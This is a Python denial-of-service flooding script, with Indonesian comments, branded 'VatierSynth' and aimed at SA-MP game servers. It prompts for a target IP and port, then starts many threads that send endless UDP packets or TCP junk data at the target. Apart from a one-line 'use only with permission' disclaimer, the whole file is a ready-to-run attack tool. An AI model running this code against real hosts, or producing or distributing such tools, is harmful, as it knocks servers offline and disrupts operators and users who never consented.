#!/usr/bin/env python3
# Brutal UDP/TCP Pentest Script by VatierSynth - SA-MP Validated
# Gunakan hanya untuk pentest dengan izin!

import random
import socket
import threading
import os

os.system("clear")
print("""
╭──────────────────────────────────────────────╮
│          VatierSynth DDoS Pentest Tool       │
│           Brutal SA-MP Valid Edition         │
╰──────────────────────────────────────────────╯
""")
ip = str(input("[VatierSynth] Target IP: "))
port = int(input("[VatierSynth] Target Port: "))
choice = str(input("[VatierSynth] UDP flood? (y/n): "))
times = int(input("[VatierSynth] Packets per thread: "))
threads = int(input("[VatierSynth] Number of threads: "))

def run_udp():
    tag = random.choice(("[*]", "[!]", "[#]"))
    samp_packets = [
        b'SAMP',                                # SAMP header
        b'\xFF\xFF\xFF\xFF\x62\x6F\x6F\x6D',    # SA-MP RCON/info packet
    ]
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            addr = (ip, port)
            for _ in range(times * 3):  # lebih brutal: 3x packets per loop
                size = random.randint(1024, 16384)  # sampai 16KB!
                packet = random.choice(samp_packets + [random._urandom(size)])
                s.sendto(packet, addr)
            print(f"{tag} [VatierSynth] Sent {times*3} UDP packets (1-16KB) to {ip}:{port}")
        except Exception as e:
            print(f"[!] [VatierSynth] UDP error: {e}")

def run_tcp():
    tag = random.choice(("[*]", "[!]", "[#]"))
    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            s.settimeout(3)
            s.connect((ip, port))
            for _ in range(times * 2):  # lebih brutal: 2x packets per loop
                size = random.randint(1024, 8192)
                data = random._urandom(size)
                s.send(data)
            print(f"{tag} [VatierSynth] Sent {times*2} TCP packets (1-8KB) to {ip}:{port}")
            s.close()
        except Exception as e:
            print(f"[!] [VatierSynth] TCP error: {e}")

for y in range(threads):
    if choice.lower() == 'y':
        th = threading.Thread(target=run_udp)
        th.start()
    else:
        th = threading.Thread(target=run_tcp)
        th.start()
